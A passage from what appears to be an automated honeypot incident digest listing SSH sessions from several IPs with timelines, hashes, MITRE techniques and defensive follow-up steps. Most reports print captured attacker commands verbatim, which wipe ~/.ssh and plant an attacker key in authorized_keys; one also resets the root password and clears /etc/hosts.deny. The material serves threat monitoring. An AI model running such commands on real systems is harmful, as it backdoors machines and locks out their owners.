| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 05:58:19` | `cowrie.session.connect` |
| `2026-04-13 05:58:19` | `cowrie.client.version` |
| `2026-04-13 05:58:19` | `cowrie.client.kex` |
| `2026-04-13 05:58:20` | `cowrie.login.success` |
| `2026-04-13 05:58:20` | `cowrie.session.params` |
| `2026-04-13 05:58:20` | `cowrie.command.input` |
| `2026-04-13 05:58:20` | `cowrie.command.failed` |
| `2026-04-13 05:58:20` | `cowrie.log.closed` |
| `2026-04-13 05:58:21` | `cowrie.session.params` |
| `2026-04-13 05:58:21` | `cowrie.command.input` |
| `2026-04-13 05:58:21` | `cowrie.session.file_download` |
| `2026-04-13 05:58:21` | `cowrie.log.closed` |
| `2026-04-13 05:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd74e3cf7991

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-13 05:58 |
| **Last Seen** | 2026-04-13 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 05:58:22` | `cowrie.session.connect` |
| `2026-04-13 05:58:22` | `cowrie.client.version` |
| `2026-04-13 05:58:23` | `cowrie.client.kex` |
| `2026-04-13 05:58:23` | `cowrie.login.success` |
| `2026-04-13 05:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-164c2da7c4c9

| Field | Detail |
|---|---|
| **Source IP** | `135.181.107[.]145` |
| **First Seen** | 2026-04-13 05:58 |
| **Last Seen** | 2026-04-13 05:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 05:58:49` | `cowrie.session.connect` |
| `2026-04-13 05:58:49` | `cowrie.client.version` |
| `2026-04-13 05:58:49` | `cowrie.client.kex` |
| `2026-04-13 05:58:49` | `cowrie.login.success` |
| `2026-04-13 05:58:50` | `cowrie.session.params` |
| `2026-04-13 05:58:50` | `cowrie.command.input` |
| `2026-04-13 05:58:50` | `cowrie.command.failed` |
| `2026-04-13 05:58:50` | `cowrie.log.closed` |
| `2026-04-13 05:58:50` | `cowrie.session.params` |
| `2026-04-13 05:58:50` | `cowrie.command.input` |
| `2026-04-13 05:58:50` | `cowrie.session.file_download` |
| `2026-04-13 05:58:50` | `cowrie.log.closed` |
| `2026-04-13 05:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.181.107[.]145` to AbuseIPDB if not already reported
- [ ] Block `135.181.107[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb454b1c039a

| Field | Detail |
|---|---|
| **Source IP** | `135.181.107[.]145` |
| **First Seen** | 2026-04-13 05:58 |
| **Last Seen** | 2026-04-13 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 05:58:53` | `cowrie.session.connect` |
| `2026-04-13 05:58:53` | `cowrie.client.version` |
| `2026-04-13 05:58:53` | `cowrie.client.kex` |
| `2026-04-13 05:58:53` | `cowrie.login.success` |
| `2026-04-13 05:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.181.107[.]145` to AbuseIPDB if not already reported
- [ ] Block `135.181.107[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec5664d76c05

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]107` |
| **First Seen** | 2026-04-13 06:00 |
| **Last Seen** | 2026-04-13 06:01 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:47HaUH7kLwH5"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:00:52` | `cowrie.session.connect` |
| `2026-04-13 06:00:52` | `cowrie.client.version` |
| `2026-04-13 06:00:52` | `cowrie.client.kex` |
| `2026-04-13 06:00:53` | `cowrie.login.success` |
| `2026-04-13 06:00:53` | `cowrie.session.params` |
| `2026-04-13 06:00:53` | `cowrie.command.input` |
| `2026-04-13 06:00:53` | `cowrie.command.failed` |
| `2026-04-13 06:00:53` | `cowrie.log.closed` |
| `2026-04-13 06:00:54` | `cowrie.session.params` |
| `2026-04-13 06:00:54` | `cowrie.command.input` |
| `2026-04-13 06:00:54` | `cowrie.session.file_download` |
| `2026-04-13 06:00:54` | `cowrie.log.closed` |
| `2026-04-13 06:01:04` | `cowrie.session.params` |
| `2026-04-13 06:01:04` | `cowrie.command.input` |
| `2026-04-13 06:01:04` | `cowrie.log.closed` |
| `2026-04-13 06:01:04` | `cowrie.session.params` |
| `2026-04-13 06:01:04` | `cowrie.command.input` |
| `2026-04-13 06:01:04` | `cowrie.log.closed` |
| `2026-04-13 06:01:05` | `cowrie.session.params` |
| `2026-04-13 06:01:05` | `cowrie.command.input` |
| `2026-04-13 06:01:05` | `cowrie.session.file_download` |
| `2026-04-13 06:01:05` | `cowrie.log.closed` |
| `2026-04-13 06:01:05` | `cowrie.session.params` |
| `2026-04-13 06:01:05` | `cowrie.command.input` |
| `2026-04-13 06:01:06` | `cowrie.log.closed` |
| `2026-04-13 06:01:06` | `cowrie.session.params` |
| `2026-04-13 06:01:06` | `cowrie.command.input` |
| `2026-04-13 06:01:07` | `cowrie.log.closed` |
| `2026-04-13 06:01:07` | `cowrie.session.params` |
| `2026-04-13 06:01:07` | `cowrie.command.input` |
| `2026-04-13 06:01:07` | `cowrie.command.input` |
| `2026-04-13 06:01:08` | `cowrie.log.closed` |
| `2026-04-13 06:01:08` | `cowrie.session.params` |
| `2026-04-13 06:01:08` | `cowrie.command.input` |
| `2026-04-13 06:01:08` | `cowrie.log.closed` |
| `2026-04-13 06:01:09` | `cowrie.session.params` |
| `2026-04-13 06:01:09` | `cowrie.command.input` |
| `2026-04-13 06:01:09` | `cowrie.log.closed` |
| `2026-04-13 06:01:09` | `cowrie.session.params` |
| `2026-04-13 06:01:09` | `cowrie.command.input` |
| `2026-04-13 06:01:09` | `cowrie.log.closed` |
| `2026-04-13 06:01:10` | `cowrie.session.params` |
| `2026-04-13 06:01:10` | `cowrie.command.input` |
| `2026-04-13 06:01:10` | `cowrie.log.closed` |
| `2026-04-13 06:01:10` | `cowrie.session.params` |
| `2026-04-13 06:01:10` | `cowrie.command.input` |
| `2026-04-13 06:01:10` | `cowrie.log.closed` |
| `2026-04-13 06:01:10` | `cowrie.session.params` |
| `2026-04-13 06:01:10` | `cowrie.command.input` |
| `2026-04-13 06:01:11` | `cowrie.log.closed` |
| `2026-04-13 06:01:11` | `cowrie.session.params` |
| `2026-04-13 06:01:11` | `cowrie.command.input` |
| `2026-04-13 06:01:11` | `cowrie.log.closed` |
| `2026-04-13 06:01:11` | `cowrie.session.params` |
| `2026-04-13 06:01:11` | `cowrie.command.input` |
| `2026-04-13 06:01:11` | `cowrie.log.closed` |
| `2026-04-13 06:01:12` | `cowrie.session.params` |
| `2026-04-13 06:01:12` | `cowrie.command.input` |
| `2026-04-13 06:01:12` | `cowrie.log.closed` |
| `2026-04-13 06:01:12` | `cowrie.session.params` |
| `2026-04-13 06:01:12` | `cowrie.command.input` |
| `2026-04-13 06:01:12` | `cowrie.log.closed` |
| `2026-04-13 06:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]107` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b73103e2be9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]142` |
| **First Seen** | 2026-04-13 06:01 |
| **Last Seen** | 2026-04-13 06:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:01:05` | `cowrie.session.connect` |
| `2026-04-13 06:01:05` | `cowrie.client.version` |
| `2026-04-13 06:01:06` | `cowrie.client.kex` |
| `2026-04-13 06:01:07` | `cowrie.login.success` |
| `2026-04-13 06:01:07` | `cowrie.session.params` |
| `2026-04-13 06:01:07` | `cowrie.command.input` |
| `2026-04-13 06:01:07` | `cowrie.command.failed` |
| `2026-04-13 06:01:07` | `cowrie.log.closed` |
| `2026-04-13 06:01:08` | `cowrie.session.params` |
| `2026-04-13 06:01:08` | `cowrie.command.input` |
| `2026-04-13 06:01:08` | `cowrie.session.file_download` |
| `2026-04-13 06:01:08` | `cowrie.log.closed` |
| `2026-04-13 06:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]142` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e437cd8bcd4a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]142` |
| **First Seen** | 2026-04-13 06:01 |
| **Last Seen** | 2026-04-13 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:01:16` | `cowrie.session.connect` |
| `2026-04-13 06:01:16` | `cowrie.client.version` |
| `2026-04-13 06:01:16` | `cowrie.client.kex` |
| `2026-04-13 06:01:16` | `cowrie.login.success` |
| `2026-04-13 06:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]142` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5efa42064c14

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:03 |
| **Last Seen** | 2026-04-13 06:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:03:33` | `cowrie.session.connect` |
| `2026-04-13 06:03:33` | `cowrie.client.version` |
| `2026-04-13 06:03:33` | `cowrie.client.kex` |
| `2026-04-13 06:03:34` | `cowrie.login.success` |
| `2026-04-13 06:03:34` | `cowrie.session.params` |
| `2026-04-13 06:03:34` | `cowrie.command.input` |
| `2026-04-13 06:03:34` | `cowrie.command.failed` |
| `2026-04-13 06:03:34` | `cowrie.log.closed` |
| `2026-04-13 06:03:34` | `cowrie.session.params` |
| `2026-04-13 06:03:34` | `cowrie.command.input` |
| `2026-04-13 06:03:34` | `cowrie.session.file_download` |
| `2026-04-13 06:03:34` | `cowrie.log.closed` |
| `2026-04-13 06:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1af9c57b864

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:03 |
| **Last Seen** | 2026-04-13 06:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:03:37` | `cowrie.session.connect` |
| `2026-04-13 06:03:37` | `cowrie.client.version` |
| `2026-04-13 06:03:37` | `cowrie.client.kex` |
| `2026-04-13 06:03:37` | `cowrie.login.success` |
| `2026-04-13 06:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5635da5dec5c

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:03 |
| **Last Seen** | 2026-04-13 06:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:03:38` | `cowrie.session.connect` |
| `2026-04-13 06:03:38` | `cowrie.client.version` |
| `2026-04-13 06:03:38` | `cowrie.client.kex` |
| `2026-04-13 06:03:38` | `cowrie.login.success` |
| `2026-04-13 06:03:38` | `cowrie.session.params` |
| `2026-04-13 06:03:38` | `cowrie.command.input` |
| `2026-04-13 06:03:38` | `cowrie.command.failed` |
| `2026-04-13 06:03:38` | `cowrie.log.closed` |
| `2026-04-13 06:03:38` | `cowrie.session.params` |
| `2026-04-13 06:03:38` | `cowrie.command.input` |
| `2026-04-13 06:03:38` | `cowrie.session.file_download` |
| `2026-04-13 06:03:38` | `cowrie.log.closed` |
| `2026-04-13 06:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1700a9094180

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:03 |
| **Last Seen** | 2026-04-13 06:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:03:40` | `cowrie.session.connect` |
| `2026-04-13 06:03:40` | `cowrie.client.version` |
| `2026-04-13 06:03:40` | `cowrie.client.kex` |
| `2026-04-13 06:03:40` | `cowrie.login.success` |
| `2026-04-13 06:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d871e356eb63

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:04 |
| **Last Seen** | 2026-04-13 06:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:04:29` | `cowrie.session.connect` |
| `2026-04-13 06:04:29` | `cowrie.client.version` |
| `2026-04-13 06:04:29` | `cowrie.client.kex` |
| `2026-04-13 06:04:30` | `cowrie.login.success` |
| `2026-04-13 06:04:31` | `cowrie.session.params` |
| `2026-04-13 06:04:31` | `cowrie.command.input` |
| `2026-04-13 06:04:31` | `cowrie.command.failed` |
| `2026-04-13 06:04:31` | `cowrie.log.closed` |
| `2026-04-13 06:04:32` | `cowrie.session.params` |
| `2026-04-13 06:04:32` | `cowrie.command.input` |
| `2026-04-13 06:04:32` | `cowrie.session.file_download` |
| `2026-04-13 06:04:32` | `cowrie.log.closed` |
| `2026-04-13 06:04:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f46e9c267a5

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:04 |
| **Last Seen** | 2026-04-13 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:04:36` | `cowrie.session.connect` |
| `2026-04-13 06:04:36` | `cowrie.client.version` |
| `2026-04-13 06:04:36` | `cowrie.client.kex` |
| `2026-04-13 06:04:38` | `cowrie.login.success` |
| `2026-04-13 06:04:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aca4c620357

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:05 |
| **Last Seen** | 2026-04-13 06:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:05:15` | `cowrie.session.connect` |
| `2026-04-13 06:05:15` | `cowrie.client.version` |
| `2026-04-13 06:05:15` | `cowrie.client.kex` |
| `2026-04-13 06:05:15` | `cowrie.login.success` |
| `2026-04-13 06:05:16` | `cowrie.session.params` |
| `2026-04-13 06:05:16` | `cowrie.command.input` |
| `2026-04-13 06:05:16` | `cowrie.command.failed` |
| `2026-04-13 06:05:16` | `cowrie.log.closed` |
| `2026-04-13 06:05:16` | `cowrie.session.params` |
| `2026-04-13 06:05:16` | `cowrie.command.input` |
| `2026-04-13 06:05:16` | `cowrie.session.file_download` |
| `2026-04-13 06:05:16` | `cowrie.log.closed` |
| `2026-04-13 06:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53f2c6bf4e4

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:05 |
| **Last Seen** | 2026-04-13 06:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
